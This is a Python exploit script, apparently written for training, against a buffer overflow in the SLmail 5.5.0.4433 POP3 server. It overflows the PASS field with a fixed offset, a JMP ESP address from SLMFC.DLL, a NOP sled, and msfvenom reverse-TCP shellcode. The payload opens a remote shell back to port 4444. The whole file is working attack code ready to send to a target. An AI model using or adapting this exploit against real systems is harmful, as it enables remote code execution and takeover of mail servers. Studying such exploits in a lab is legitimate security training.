#!/usr/bin/env python
#SLmail v5.5.0.4433 Remote Code Execution Exploit
#Date: 09-04-2017
#OS Name:     Microsoft Windows 7 Ultimate x64
#OS Version:  6.1.7601 Service Pack 1 Build 7601
#Twitter: @0x616163
#Created for educational purposes
import sys
import socket

#target POP3 server
target = '127.0.0.1'

#EIP offset
buf = "A" * 4654

#JMP ESP instruction from slmfc.dll (DEP / ASLR not compiled in)
#Message=  0x5f4b41e3 : "\xff\xe4" |  {PAGE_READONLY} [SLMFC.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.00.8063.0 (C:\Windows\system32\SLMFC.DLL)
buf += "\xe3\x41\x4b\x5f"

#NOP sled
buf += "\x90" * 20

#Shellcode generated by msfvenom
#ESP buffer is 484 bytes; shellcode below is 360 bytes
#Bad characters \x00\x0a\x0d
#msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f py -a x86 -b "\x00\x0a\x0d"
buf += "\xbd\x49\x56\x91\xa7\xdb\xd0\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x54\x31\x6f\x13\x83\xef\xfc\x03\x6f\x46\xb4"
buf += "\x64\x5b\xb0\xba\x87\xa4\x40\xdb\x0e\x41\x71\xdb\x75"
buf += "\x01\x21\xeb\xfe\x47\xcd\x80\x53\x7c\x46\xe4\x7b\x73"
buf += "\xef\x43\x5a\xba\xf0\xf8\x9e\xdd\x72\x03\xf3\x3d\x4b"
buf += "\xcc\x06\x3f\x8c\x31\xea\x6d\x45\x3d\x59\x82\xe2\x0b"
buf += "\x62\x29\xb8\x9a\xe2\xce\x08\x9c\xc3\x40\x03\xc7\xc3"
buf += "\x63\xc0\x73\x4a\x7c\x05\xb9\x04\xf7\xfd\x35\x97\xd1"
buf += "\xcc\xb6\x34\x1c\xe1\x44\x44\x58\xc5\xb6\x33\x90\x36"
buf += "\x4a\x44\x67\x45\x90\xc1\x7c\xed\x53\x71\x59\x0c\xb7"
buf += "\xe4\x2a\x02\x7c\x62\x74\x06\x83\xa7\x0e\x32\x08\x46"
buf += "\xc1\xb3\x4a\x6d\xc5\x98\x09\x0c\x5c\x44\xff\x31\xbe"
buf += "\x27\xa0\x97\xb4\xc5\xb5\xa5\x96\x81\x7a\x84\x28\x51"
buf += "\x15\x9f\x5b\x63\xba\x0b\xf4\xcf\x33\x92\x03\x30\x6e"
buf += "\x62\x9b\xcf\x91\x93\xb5\x0b\xc5\xc3\xad\xba\x66\x88"
buf += "\x2d\x43\xb3\x25\x24\xd3\xfc\x12\x3a\x11\x95\x60\x3b"
buf += "\x44\x39\xec\xdd\x36\x91\xbe\x71\xf6\x41\x7f\x22\x9e"
buf += "\x8b\x70\x1d\xbe\xb3\x5a\x36\x54\x5c\x33\x6e\xc0\xc5"
buf += "\x1e\xe4\x71\x09\xb5\x80\xb1\x81\x3c\x74\x7f\x62\x34"
buf += "\x66\x97\x13\xb6\x76\x67\xbe\xb6\x1c\x63\x68\xe0\x88"
buf += "\x69\x4d\xc6\x16\x92\xb8\x54\x50\x6c\x3d\x6d\x2a\x5a"
buf += "\xab\xd1\x44\xa2\x3b\xd2\x94\xf4\x51\xd2\xfc\xa0\x01"
buf += "\x81\x19\xaf\x9f\xb5\xb1\x25\x20\xec\x66\xee\x48\x12"
buf += "\x50\xd8\xd6\xed\xb7\x5b\x10\x11\x45\x79\xb9\x7a\xb5"
buf += "\x3d\x39\x7b\xdf\xbd\x69\x13\x14\x92\x86\xd3\xd5\x39"
buf += "\xcf\x7b\x5f\xaf\xbd\x1a\x60\xfa\x60\x83\x61\x08\xb9"
buf += "\xd2\xef\xef\x3e\xdb\x11\xcc\xe8\xe2\x67\x15\x29\x51"
buf += "\x77\x2c\x0c\xf0\x12\x4e\x02\x02\x37"

#Send payload to SLMail
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target,110))
sock.send("USER aac " + '\r\n')
data = sock.recv(1024)
sock.send("PASS " + buf + '\r\n')
data = sock.recv(1024)
sock.close()
